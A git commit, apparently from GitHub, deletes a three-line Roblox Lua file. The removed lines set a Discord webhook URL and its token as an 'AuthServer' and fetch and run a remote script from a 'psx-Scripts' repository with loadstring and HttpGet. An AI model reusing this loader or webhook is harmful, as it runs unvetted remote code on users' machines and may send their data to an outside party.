7cafe97e1b7fced874e431b85a477c6310191d9f
Extremescripted <120589176+Extremescripted@users.noreply.github.com>
2022-12-17 20:13:39 +0100

    Delete hahaha.lua

--- hahaha.lua
+++
@@ -1,3 +0,0 @@
-_G.Key = "tset_etintrof"
-_G.AuthServer = "https://discord.com/api/webhooks/1053624636891476039/16bYInu5xBTkHsVlyqELJngxKDRYPQdGHFZdyVvKsXN8hvuXvzkt7viEYhY0lzZtntua"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
